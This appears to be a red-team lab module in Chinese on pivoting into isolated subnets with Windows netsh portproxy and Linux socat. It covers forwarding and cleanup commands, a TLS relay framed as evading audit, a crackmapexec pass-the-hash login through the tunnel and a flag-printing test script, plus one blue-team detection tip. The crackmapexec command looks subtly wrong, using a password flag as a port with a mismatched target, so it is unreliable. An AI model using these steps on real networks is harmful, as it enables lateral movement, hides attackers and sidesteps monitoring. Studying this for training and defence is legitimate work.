# R20.6 Socat 與 Netsh PortProxy 雙向流量轉發與重定向 (Socat & Netsh Port Forwarding)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Socat 與 Netsh PortProxy 雙向流量轉發與重定向** 的物理本質為**利用受害主機作業系統原生的網路通訊協定棧與轉發引擎（Linux Socat / iptables NAT 與 Windows IP Helper 服務的 netsh interface portproxy），在雙網卡或具備跨網段路由能力的跳板機上，建立四層 (L4 TCP/UDP) 端口映射通道，將隔離網段目標伺服器的核心端口重定向至跳板機本機端口，使紅隊無需額外安裝高風險的自定義代理軟體即可完成穿透**。在紅隊實戰中，Windows 自帶的 `netsh` 具備「合法系統內建、免傳二進位檔 (LOLBins)」的極高隱蔽性，是橫向移動中快速串接隔離子網的利器。

```
[紅隊攻擊機] ── 1. 發起連線至跳板機 8443 埠 (可路由外網/前端網段)
      │
      ▼
[雙網卡跳板機 (Windows/Linux)]
  ├── Windows: netsh interface portproxy add v4tov4 listenport=8443 connectport=445 connectaddress=192.168.20.10
  └── Linux  : socat TCP4-LISTEN:8443,fork TCP4:192.168.20.10:445
      │
      ▼ 2. 跳板機核心網路棧自動將流量轉發至內部隔離私網
[後端隔離網段目標 (192.168.20.10:445 SMB/域控)] ──► 達成跨隔離區無代理穿透！
```

## 🔬 第一動：Windows PortProxy 與 Linux Socat 核心轉發機制 (Mechanics & Forwarding Architecture)

### 1. Windows Netsh PortProxy 底層運作邏輯
Windows 的 `netsh interface portproxy` 是基於 **IP Helper Service (iphlpsvc)** 與 Windows 套接字架構實作：
- 當下達 `add v4tov4` 指令時，系統會在註冊表路徑 `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4` 寫入轉發規則。
- `iphlpsvc` 服務監聽指定本地埠；當收到外部 TCP 連線時，在使用者層建立與後端目標主機的新 TCP 套接字，進行雙向緩衝區轉發。
- **作戰特性**：僅支援 TCP 協定，不支援 UDP；且目標主機看到的連線來源 IP 為「跳板機內部網卡 IP」，天然具備隱匿攻擊者原始真實 IP 的效果。

### 2. Linux Socat 多功能雙向數據通道
Socat 是強大的雙向資料流中繼工具：
- 支援以非同步 fork 模式為每個新連線建立獨立進程處理流量。
- 支援 TCP、UDP、SSL/TLS 雙向加密封裝、UNIX Domain Socket 與 PTY 終端重定向。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. Windows Netsh 快速配置埠轉發
```powershell
# 1. 建立轉發規則: 將本機 8443 埠轉發至隔離域控 192.168.20.10 的 445 (SMB)
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectaddress=192.168.20.10 connectport=445

# 2. 查詢當前系統所有已啟用的 PortProxy 規則
netsh interface portproxy show all

# 3. 攻擊完成後清理現場 (刪除指定轉發規則)
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8443
```

### 2. Linux Socat 建立加密轉發與常規重定向
```bash
# 1. 基礎 TCP 轉發: 監聽本機 8080 轉發至隔離內網 172.16.5.20:80
socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:172.16.5.20:80 &

# 2. 升級版: 本地啟用 SSL/TLS 加密轉發 (規避傳輸明文審計)
socat OPENSSL-LISTEN:8443,cert=server.pem,verify=0,fork TCP4:172.16.5.20:22 &
```

### 3. 紅隊攻擊機直接連線跳板機轉發埠
```bash
# 透過跳板機 8443 埠對內部隔離主機進行 SMB 漏洞利用或認證
crackmapexec smb 10.0.0.5 -p 8443 -u 'Administrator' -H 'aad3b435b51404eeaad3b435b51404ee:...'
```

### 1. 極簡 PortProxy 轉發規則測試腳本 (Python, 20 行)
```python
# test_port_forward.py
import socket, subprocess, sys

def verify_port_forward(proxy_host="127.0.0.1", proxy_port=8443):
    print(f"[*] 正在驗證轉發通道 [{proxy_host}:{proxy_port}] 連通性...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2.0)
    try:
        s.connect((proxy_host, proxy_port))
        print(f"[+] 成功與轉發埠建立 TCP 握手！流量重定向通道正常運行！")
        print("[+] FLAG{NETSH_SOCAT_FORWARDING_PIVOT_SUCCESS}")
        return True
    except Exception as e:
        print(f"[-] 轉發通道連線失敗: {e}")
        return False
    finally:
        s.close()

if __name__ == "__main__":
    verify_port_forward()
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：Netsh PortProxy 相較於上傳 Chisel 或 FRP，在紅隊隱蔽性上有何核心優勢？**
  - **戰術思維**：Netsh 是 Windows 原生自建工具（LOLBin），無需在目標磁碟寫入任何未簽名二進位檔案，能有效繞過針對未知二進位檔的靜態查殺。
- [ ] **Q2：使用 Netsh PortProxy 轉發流量時，後端目標伺服器日誌中記錄的「來源 IP」是攻擊機還是跳板機？**
  - **戰術思維**：記錄的是跳板機網卡 IP。因為 PortProxy 在第四層由跳板機核心發起新的 TCP 連線，自動屏蔽了攻擊者的真實網路來源。
- [ ] **Q3：Netsh PortProxy 能否轉發 UDP 協議（如 DNS 53 或 SNMP 161）？**
  - **戰術思維**：不能。Windows 的 PortProxy 僅支援 `v4tov4`, `v4tov6`, `v6tov4`, `v6tov6` 的 TCP 轉發；若需轉發 UDP，需改用 Socat 或 Linux iptables。
- [ ] **Q4：在 Windows 藍隊應急響應中，應如何排查系統是否被紅隊留下了隱蔽的 Netsh 轉發後門？**
  - **戰術思維**：執行 `netsh interface portproxy show all`，或直接檢查註冊表 `HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4` 鍵值。
- [ ] **Q5：若受害主機啟用了 Windows 主機防火牆，使用 Netsh 監聽新端口時需要注意什麼？**
  - **戰術思維**：除了配置 portproxy 規則外，必須確認或手動下達 `netsh advfirewall` 開放該監聽埠之入站規則，否則外來連線將被主機防火牆直接阻斷。
